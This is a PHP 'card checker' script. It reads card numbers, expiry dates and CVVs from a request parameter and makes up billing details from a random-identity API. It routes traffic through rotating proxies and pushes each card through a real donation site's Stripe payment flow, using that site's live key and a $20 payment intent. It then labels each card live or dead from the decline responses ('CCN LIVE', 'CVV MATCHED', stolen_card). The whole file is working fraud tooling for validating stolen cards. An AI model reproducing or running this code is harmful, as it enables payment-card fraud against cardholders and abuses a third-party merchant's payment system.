<?php

///////////////////////////////////Reboot13/////{Haters= yaha kyu aaye ho bc}

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
//include("bin.php");


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function monarchproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = monarchproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";}


switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
$url = 'https://wacaustin.org/wp2015/wp-admin/admin-ajax.php';
$post = 'action=asp_pp_req_token&amount=2000&curr=USD&product_id=5497&quantity=1&billing_details={"name":"'.$name.' '.$last.'","email":"'.$email.'","address":{"line1":"'.$street.'","city":"'.$city.'","country":"US","postal_code":"'.$postcode.'"}}';
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // following the location when you applied a proxy
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // 0 means false, to disable ssl certificate validation of a site
curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_POST, 1); // enabling post method for this curl (req)
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                 'POST /wp2015/wp-admin/admin-ajax.php HTTP/1.1',
                 'Host: wacaustin.org',
                 'Connection: keep-alive', 
                 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36', 
                 'Content-Type: application/x-www-form-urlencoded',
                 'Accept: */*', 
                 'Origin: https://wacaustin.org', 
                 'Sec-Fetch-Site: same-origin', 
                 'Sec-Fetch-Mode: cors', 
                 'Sec-Fetch-Dest: empty', 
                 'Referer: https://wacaustin.org/?asp_action=show_pp&product_id=5497', 
                 'Accept-Language: en-US,en;q=0.9,ru;q=0.8,ko;q=0.7', 
                 ' Cookie: __stripe_mid=55248cf8-c309-46b8-ba5a-efce418e45d0; asp_transient_id=1a2631d0c7d2d2d1b3978e5fbbf4072c; tk_ai=woo%3AFfZX1eeIVx5NauIch861dY4H; __stripe_sid=22c5c9c2-bed0-4402-9e5c-582df254865d', 
                 'Accept-Encoding: gzip, deflate', 
                 'Content-Length: '.strlen($post).''

));
$result = curl_exec($ch);
$resulta1 = json_decode($result, true); // enabling the json decoding for the results
curl_close($ch);
$token = $resulta1['clientSecret']; // capturing the "id" value
$token2 = $resulta1['pi_id']; // capturing the "pi_id" value
//echo "<font class='badge badge-secondary'> clientSecret: $token </font>";
//echo "<font class='badge badge-secondary'> pi_id: $token2 </font>";


if (isset($resulta1['pi_id'])) { // if token exist will proceed to this req
    $ch = curl_init();
    //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
    $url = 'https://api.stripe.com/v1/payment_intents/'.$token2.'/confirm';
    $post = 'save_payment_method=true&setup_future_usage=off_session&payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'+'.$last.'&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][city]='.$city.'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]='.$postcode.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=99a57384-e468-47b2-a1b6-07393c557b5d&payment_method_data[muid]=55248cf8-c309-46b8-ba5a-efce418e45d0&payment_method_data[sid]=1bab7c62-e68e-4989-8b97-c5eae3a8646b&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F5797b636%3B+stripe-js-v3%2F5797b636&payment_method_data[time_on_page]=54254&payment_method_data[referrer]=https%3A%2F%2Fwacaustin.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D5497&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_a3wrI3kiK4XO9lN0IADUKMSz&client_secret='.$token.'';
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // following the location when you applied a proxy
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // 0 means false, to disable ssl certificate validation of a site
    curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_POST, 1); // enabling post method for this curl (req)
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'POST /v1/payment_intents/'.$token2.'/confirm HTTP/1.1', 
        'Host: api.stripe.com', 
        'Connection: keep-alive', 
        'Accept: application/json', 
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36', 
        'Content-Type: application/x-www-form-urlencoded', 
        'Origin: https://js.stripe.com', 
        'Sec-Fetch-Site: same-site', 
        'Sec-Fetch-Mode: cors', 
        'Sec-Fetch-Dest: empty', 
        'Referer: https://js.stripe.com/v3/controller-ef89e48ab062a5946ecbbae42fad77cc.html', 
        'Accept-Language: en-US,en;q=0.9,ru;q=0.8,ko;q=0.7', 
        'Accept-Encoding: gzip, deflate', 
        'Content-Length: '.strlen($post).''
    ));
    $result = curl_exec($ch);
    $resulta1 = json_decode($result, true); // enabling the json decoding for the results
    curl_close($ch);

   /** $message = trim(strip_tags(getStr($result,'"":"','"'))); */
    /**$errorCode = $resulta1['error']['code'];*/
   $declineCode = $resulta1['error']['decline_code'];
   /** echo "<b>2nd Req:</b> $result";
    echo "<b>Message:</b> $message";*/
    /**echo "<b>Error Code:</b> $errorCode";*/
   //echo "<b>Decline Code:</b> $declineCode";
   //echo '<span class="new badge red"><span class="badge badge-info"> '.$declineCode.' </span></br>';
//echo '</span> <span class="badge badge-info"> </span> $declineCode </br>';
//echo "<font class='badge badge-secondary'> IP: $poxySocks4 </font>"

} else {
    echo "Problem with the 1st req!"; // else because if isset of token is empty or not exist
    echo "<b>1st Req:</b> $result";
}
 $message = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED Rabbit_002 </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED Rabbit_002 </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED Rabbit_002 </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE Rabbit_002 </span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE Rabbit_002 </span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE Rabbit_002 </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE Rabbit_002 </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED - Incorrect Zip Rabbit_002 </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">'.$declineCode.'</span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">'.$declineCode.'</span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info">'.$declineCode.' </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info">'.$declineCode.' </span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> '.$declineCode.' </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info">'.$declineCode.' </span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info">'.$declineCode.' </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> '.$declineCode.'</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info">'.$declineCode.' </span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info">'.$declineCode.'</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info">'.$declineCode.'[Proxy Dead] Rabbit_002</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info">'.$declineCode.'/span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info">'.$declineCode.'</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> '.$declineCode.'</span> </br>';
}
 else {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> ★ Proxy Dead / Error Not Listed Rabbit_002</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result 

///////////////////////////////////////////////====== By Reboot13===============\\\\\\\\\\\\\\\
?>
